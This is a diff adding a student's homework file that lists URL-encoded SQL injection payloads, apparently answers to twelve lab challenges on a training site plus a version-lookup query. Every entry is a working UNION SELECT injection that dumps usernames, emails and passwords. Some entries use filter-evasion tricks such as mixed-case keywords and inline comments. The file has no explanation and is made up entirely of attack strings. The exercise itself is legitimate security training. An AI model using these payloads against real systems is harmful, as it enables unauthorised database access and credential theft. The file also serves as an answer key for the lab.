@@ -1,0 +1,41 @@
+Megh Vakharia
+SQLi HW - Vulnerabilities
+
+Challenge 1:
+http://sqli-challenges.r7.io/meghv/1/?user_input=jim%27+union+SELECT+username%2C+email%2C+password+FROM+users%20--
+
+Challenge 2:
+http://sqli-challenges.r7.io/meghv/2/?user_name=user&password=password%27+UNION+select+username%2C+email%2C+password+from+users+--
+
+Challenge 3:
+http://sqli-challenges.r7.io/meghv/3/?user_input=jim%27+union+SELECT+username%7C%7C%27%3A%27%7C%7Cpassword+FROM+users+where+username+like+%27flag%25
+
+Challenge 4:
+http://sqli-challenges.r7.io/meghv/4/?user_input=1984%27+union+select+username%2C+email%2C+password%2C+null+from+users--
+
+Challenge 5:
+http://sqli-challenges.r7.io/meghv/5/?user_input=1984%27+union+select+username%2C+email%2C+password%2C+null%2C+null+from+users--
+
+Challenge 6:
+http://sqli-challenges.r7.io/meghv/6/?user_input=1984%27+union+select+null%2Cnull%2Cnull%2Cusername%2Cnull+from+users+where+username+like+%27flag%25%27+union+select+null%2Cnull%2Cnull%2Cpassword%2Cnull+from+users+where+username+like+%27flag%25
+
+Challenge 7:
+http://sqli-challenges.r7.io/meghv/7/?user_input=1984%27+union+select+username%7C%7C%27%3A%27%7C%7Cpassword+from+users+--
+
+Challenge 8:
+http://sqli-challenges.r7.io/meghv/8/?user_input=1984%27+union+select+1%2C+username%7C%7C%27%3A%27%7C%7Cpassword+from+users+--
+
+Challenge 9:
+http://sqli-challenges.r7.io/meghv/9/?user_input=1984%27+union+SeLeCt+username%2C+email%2C+password%2C+null%2C+null+from+users+--
+
+Challenge 10:
+http://sqli-challenges.r7.io/meghv/10/?user_input=1984%27+union%2F**%2Fselect%2F**%2Fusername%2Cemail%2Cpassword%2Cnull%2Cnull%2F**%2Ffrom%2F**%2Fusers+--
+
+Challenge 11:
+http://sqli-challenges.r7.io/meghv/11/?user_input=1984%27+union+select+id%2Cusername%2Cemail%2Cpassword%2Cnull+from+supersecretuserstable+--
+
+Challenge 12:
+http://sqli-challenges.r7.io/meghv/12/?user_input=1984%27+union+select+id%2Cusername%2Cpassword%2Cemail+from+o%2F*othersupersecretuserstable*%2Fthersupersecretuserstable+--
+
+Version Number (3.7.9):
+http://sqli-challenges.r7.io/meghv/1/?user_input=jim%27+union+select+%27sqlite+version%3A%27%7C%7Csqlite_version%28%29%2C+null%2Cnull+--
